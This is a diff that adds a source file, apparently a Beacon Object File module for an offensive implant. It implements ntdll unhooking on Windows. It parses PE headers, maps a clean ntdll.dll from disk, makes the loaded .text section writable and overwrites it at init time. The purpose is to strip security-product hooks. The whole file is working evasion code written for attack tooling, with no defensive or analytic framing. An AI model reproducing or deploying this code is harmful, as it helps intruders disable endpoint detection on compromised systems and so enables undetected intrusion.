@@ -1,0 +1,116 @@
+
+use bof;
+
+
+fn opsec_unhook_section_text(base: u64, va_out: u32*,
+                             sz_out: u32*) -> int {
+    // e_lfanew at offset 0x3C of the DOS header (LE u32).
+    var b: char* = (char*)base;
+    var e_lfanew: u32 = (u32)((u32)b[60] | ((u32)b[61] << 8)
+        | ((u32)b[62] << 16) | ((u32)b[63] << 24));
+    var nt: u64 = base + (u64)e_lfanew;
+
+    // FileHeader is at nt + 4 (after "PE\0\0"). NumberOfSections
+    // and SizeOfOptionalHeader live at offsets 2 and 16 of the
+    // file header respectively.
+    var fh: char* = (char*)(nt + (u64)4);
+    var nsec: u32 = (u32)((u32)fh[2] | ((u32)fh[3] << 8));
+    var opt: u32 = (u32)((u32)fh[16] | ((u32)fh[17] << 8));
+
+    // Section table immediately follows the optional header.
+    var sect: u64 = nt + (u64)4 + (u64)20 + (u64)opt;
+
+    var i: u32 = 0;
+    while i < nsec {
+        var s: char* = (char*)(sect + (u64)i * (u64)40);
+        // .text  == 2E 74 65 78 74 00 00 00
+        if s[0] == (u8)0x2E { if s[1] == (u8)0x74 {
+        if s[2] == (u8)0x65 { if s[3] == (u8)0x78 {
+        if s[4] == (u8)0x74 { if s[5] == (u8)0x00 {
+            var va: u32 = (u32)((u32)s[12] | ((u32)s[13] << 8)
+                | ((u32)s[14] << 16) | ((u32)s[15] << 24));
+            var sz: u32 = (u32)((u32)s[16] | ((u32)s[17] << 8)
+                | ((u32)s[18] << 16) | ((u32)s[19] << 24));
+            *va_out = va;
+            *sz_out = sz;
+            ret 1;
+        } } } } } }
+        i = i + (u32)1;
+    }
+    ret 0;
+}
+
+[Stage(Init)]
+fn opsec_unhook_ntdll() -> void {
+    var loaded: u64 = (u64)Kernel32.GetModuleHandleA("ntdll.dll");
+    if loaded == 0 {
+        ret;
+    }
+
+    // GENERIC_READ = 0x80000000, FILE_SHARE_READ = 1,
+    // OPEN_EXISTING = 3, FILE_ATTRIBUTE_NORMAL = 0x80.
+    var h: u64 = (u64)Kernel32.CreateFileA(
+        "C:\\Windows\\System32\\ntdll.dll",
+        (u32)0x80000000, (u32)1, (void*)0, (u32)3,
+        (u32)0x80, (void*)0);
+    // INVALID_HANDLE_VALUE = -1 cast to u64.
+    if h == (u64)0xFFFFFFFFFFFFFFFF {
+        ret;
+    }
+
+    // CreateFileMapping with PAGE_READONLY (2). The clean copy
+    // is read-only; we never modify it.
+    var mapping: u64 = (u64)Kernel32.CreateFileMappingA(
+        (void*)h, (void*)0, (u32)2, (u32)0, (u32)0, (char*)0);
+    if mapping == 0 {
+        Kernel32.CloseHandle((void*)h);
+        ret;
+    }
+
+    // FILE_MAP_READ = 4.
+    var clean: u64 = (u64)Kernel32.MapViewOfFile(
+        (void*)mapping, (u32)4, (u32)0, (u32)0, (u64)0);
+    if clean == 0 {
+        Kernel32.CloseHandle((void*)mapping);
+        Kernel32.CloseHandle((void*)h);
+        ret;
+    }
+
+    var loaded_va: u32 = 0;
+    var loaded_sz: u32 = 0;
+    var clean_va:  u32 = 0;
+    var clean_sz:  u32 = 0;
+    if opsec_unhook_section_text(loaded, &loaded_va,
+            &loaded_sz) == 0 {
+        Kernel32.UnmapViewOfFile((void*)clean);
+        Kernel32.CloseHandle((void*)mapping);
+        Kernel32.CloseHandle((void*)h);
+        ret;
+    }
+    if opsec_unhook_section_text(clean, &clean_va, &clean_sz) == 0 {
+        Kernel32.UnmapViewOfFile((void*)clean);
+        Kernel32.CloseHandle((void*)mapping);
+        Kernel32.CloseHandle((void*)h);
+        ret;
+    }
+
+    var loaded_text: u64 = loaded + (u64)loaded_va;
+    var clean_text:  u64 = clean  + (u64)clean_va;
+    var len: u64 = (u64)loaded_sz;
+    if (u64)clean_sz < len { len = (u64)clean_sz; }
+
+    // Flip the loaded .text to writable, copy, restore.
+    var old: u32 = 0;
+    if Kernel32.VirtualProtect((void*)loaded_text, len,
+            PAGE_EXECUTE_READWRITE, &old) != 0 {
+        mem.copy(loaded_text, clean_text, len);
+        var dummy: u32 = 0;
+        Kernel32.VirtualProtect((void*)loaded_text, len, old,
+            &dummy);
+    }
+
+    Kernel32.UnmapViewOfFile((void*)clean);
+    Kernel32.CloseHandle((void*)mapping);
+    Kernel32.CloseHandle((void*)h);
+    ret;
+}
